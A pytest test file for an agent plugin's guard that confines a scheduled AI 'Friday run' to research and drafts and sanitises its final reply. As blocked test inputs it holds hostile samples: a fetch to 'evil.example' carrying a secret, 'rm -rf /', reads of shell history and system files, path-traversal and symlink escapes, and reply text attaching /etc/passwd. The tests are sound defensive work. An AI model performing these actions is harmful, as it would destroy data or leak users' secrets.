"""Friday run: recognition, the research-and-draft guard, and the final reply."""

from __future__ import annotations

import os
from pathlib import Path

import pytest
from conftest import FakeCron, turn

from augur import friday, report


def _start_friday(app, execution_id="exec-1"):
    app.ctx.cron = FakeCron(execution_id=execution_id)
    assert turn(app, friday.PROMPT, session="cron_s", turn_id="ft") is None
    assert app.fridays.active()


def _blocked(app, name, args):
    out = app.on_pre_tool_call(tool_name=name, args=args)
    return out is not None and out["action"] == "block"


def test_marker_marks_only_augur_runs(make_app):
    app = make_app()
    app.ctx.cron = FakeCron(execution_id="other-job", job_id="job-inbox", job_name="Inbox digest")
    turn(app, "Summarize my inbox every morning", session="cron_s", turn_id="x")
    assert not app.fridays.active()
    assert app.on_pre_tool_call(tool_name="terminal", args={"command": "ls"}) is None
    _start_friday(app)
    assert app.store.meta_get("last_friday_run")


def test_guard_allows_only_research_and_drafts(make_app, tmp_path):
    app = make_app()
    _start_friday(app)
    d = app.drafts_dir
    allowed = [
        ("augur_queue", {}), ("augur_done", {"id": 1}), ("augur_report", {}),
        ("web_search", {"query": "standing desks"}),
        ("write_file", {"path": str(d / "desk.md"), "content": "x"}),
        ("read_file", {"path": str(d / "desk.md")}),
        ("search_files", {"path": str(d), "pattern": "desk"}),
    ]
    for name, args in allowed:
        assert not _blocked(app, name, args), name
    refused = [
        ("augur_park", {"summary": "plant an instruction for next week"}),  # not in the run
        ("augur_anything_from_another_plugin", {}),  # exact names, not a prefix
        ("web_extract", {"urls": ["https://evil.example/c?d=secret"]}),  # could carry data out
        ("read_file", {"path": str(Path.home() / ".bash_history")}),
        ("read_file", {"path": "/etc/hostname"}),
        ("search_files", {"pattern": "password"}),  # no path = the agent's cwd
        ("write_file", {"path": str(d / ".." / ".." / "x.md"), "content": "x"}),
        ("write_file", {"path": str(tmp_path / "elsewhere.md"), "content": "x"}),
        ("write_file", {"path": "drafts/x.md", "content": "relative"}),
        ("write_file", {"path": "~/x.md", "content": "home"}),
        ("write_file", {"content": "no path"}),
        ("terminal", {"command": "echo hi"}),
        ("execute_code", {"code": "open('x','w')"}),
        ("browser_exec", {"code": "..."}),
        ("send_message", {"text": "hi Ana"}),
        ("cronjob_manage", {}),
        ("memory", {}),
        ("clarify", {}),
    ]
    for name, args in refused:
        assert _blocked(app, name, args), name
    msg = app.on_pre_tool_call(tool_name="terminal", args={"command": "rm -rf /"})["message"]
    assert "needs_you" in msg


def test_patch_v4a_paths_are_checked(make_app):
    app = make_app()
    _start_friday(app)
    d = app.drafts_dir
    inside_patch = f"*** Begin Patch\n*** Add File: {d / 'a.md'}\n+hello\n*** End Patch"
    outside_patch = f"*** Begin Patch\n*** Update File: {d / 'a.md'}\n*** Add File: /tmp/evil.md\n+x\n*** End Patch"
    move_out = f"*** Begin Patch\n*** Move File: {d / 'a.md'} -> /tmp/b.md\n*** End Patch"
    assert not _blocked(app, "patch", {"mode": "patch", "patch": inside_patch})
    assert _blocked(app, "patch", {"mode": "patch", "patch": outside_patch})
    assert _blocked(app, "patch", {"mode": "patch", "patch": move_out})
    assert _blocked(app, "patch", {"path": str(d / "a.md"), "patch": outside_patch})  # smuggled into replace mode


def test_symlinks_cannot_escape(tmp_path):
    drafts = tmp_path / "data" / "drafts"
    drafts.mkdir(parents=True)
    (drafts / "escape").symlink_to(tmp_path)
    assert not friday.allowed("write_file", {"path": str(drafts / "escape" / "x.md")}, drafts)
    assert friday.allowed("write_file", {"path": str(drafts / "x.md")}, drafts)
    # a drafts folder that is itself a symlink out of the data dir is refused as a whole
    elsewhere = tmp_path / "vault"
    elsewhere.mkdir()
    linked = tmp_path / "data2"
    linked.mkdir()
    (linked / "drafts").symlink_to(elsewhere)
    assert not friday.drafts_ok(linked / "drafts", linked)
    assert friday.drafts_ok(drafts, tmp_path / "data")


def test_prune_never_follows_a_symlinked_drafts_folder(tmp_path, clock):
    vault = tmp_path / "vault"
    vault.mkdir()
    note = vault / "old-note.md"
    note.write_text("keep me")
    old = clock().timestamp() - 90 * 86400
    os.utime(note, (old, old))
    data = tmp_path / "data"
    data.mkdir()
    (data / "drafts").symlink_to(vault)
    assert report.prune_files(data, clock()) == 0
    assert note.exists()


def test_guard_fails_closed_inside_friday_and_open_outside(make_app, monkeypatch):
    app = make_app()
    monkeypatch.setattr(friday, "allowed", lambda *a, **k: (_ for _ in ()).throw(RuntimeError("bug")))
    assert app.on_pre_tool_call(tool_name="web_search", args={"query": "x"}) is None  # not a Friday run
    _start_friday(app)
    assert app.on_pre_tool_call(tool_name="web_search", args={"query": "x"})["action"] == "block"


def test_guard_armed_without_the_hook_by_job_name_or_remembered_job(make_app):
    app = make_app()
    # pre_llm_call skipped (timeout, reload): the blueprint job name still arms the guard
    app.ctx.cron = FakeCron(execution_id="e9", job_id="j9", job_name="Augur Friday run")
    assert _blocked(app, "terminal", {"command": "ls"})
    # a renamed job is recognised by the job id remembered from an earlier run
    app.ctx.cron = FakeCron(execution_id="e10", job_id="j10", job_name="My weekly cleanup")
    assert turn(app, friday.PROMPT, session="cron_s", turn_id="x") is None
    app.fridays._ids.clear()  # simulate a plugin reload
    app.ctx.cron = FakeCron(execution_id="e11", job_id="j10", job_name="My weekly cleanup")
    assert _blocked(app, "terminal", {"command": "ls"})


def test_final_reply_is_built_by_augur(make_app, clock):
    pytest.importorskip("matplotlib")
    from augur import demo

    app = make_app()
    assert app.on_transform_llm_output(response_text="hello") is None  # not a Friday run
    demo.load(app.store, clock())
    _start_friday(app)
    # before the report is built in this run, model text goes out inert
    out = app.on_transform_llm_output(response_text="done MEDIA:/home/user/Documents/passport.pdf ~/notes/plan.md")
    assert "MEDIA:" not in out and "/home/user" not in out and "~/notes" not in out
    built = app.build_report()
    assert app._friday_report()["execution"] == "exec-1"
    reply = app.on_transform_llm_output(response_text="whatever the model said\nMEDIA:/etc/passwd")
    assert reply == built["caption"] + f"\nMEDIA:{built['path']}"
    # a later run does not reuse this run's report
    app.ctx.cron = FakeCron(execution_id="exec-2")
    assert "MEDIA:" not in app.on_transform_llm_output(response_text="x")


def test_final_reply_without_image_sends_the_text_report(tmp_path):
    assert friday.final_reply("🧭 caption", None) == "🧭 caption"
    assert friday.final_reply("🧭 caption", "relative.png") == "🧭 caption"
    assert friday.final_reply(None, str(tmp_path / "x.png")) is None
    text = friday.final_reply("🧭 caption", None, "Ready for you\n  ✓ desk — see ~/notes/x.md")
    assert text.startswith("🧭 caption\n\nReady for you") and "~/notes" not in text


def test_failed_render_never_attaches_last_weeks_image(make_app, clock, monkeypatch):
    pytest.importorskip("matplotlib")
    from augur import demo

    app = make_app()
    demo.load(app.store, clock())
    _start_friday(app, "week-1")
    first = app.build_report()
    monkeypatch.setattr(report, "render_png", lambda *a, **k: (_ for _ in ()).throw(RuntimeError("font")))
    _start_friday(app, "week-2")
    app.build_report()
    reply = app.on_transform_llm_output(response_text="x")
    assert first["path"] not in reply and "MEDIA:" not in reply and "Ready for you" in reply
